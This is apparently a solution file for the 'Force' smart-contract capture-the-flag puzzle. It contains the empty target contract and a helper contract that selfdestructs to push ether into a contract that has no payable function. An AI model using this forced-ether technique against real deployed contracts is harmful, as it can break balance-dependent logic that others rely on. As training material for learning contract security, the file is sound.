// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/* 
 - Fallback methods
 - Sometimes the best way to attack a contract is with another contract
*/

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// Solution
// A contract cannot refuse funds given by another contract's selfdestruction.
// Therefore, all we have to do is create a contract, send ether to it, and selfdestruct it in favor of the Force contract.

contract ForceFallback {

    function force(address payable _to) external {
        selfdestruct(_to);
    }

    receive () external payable {}
}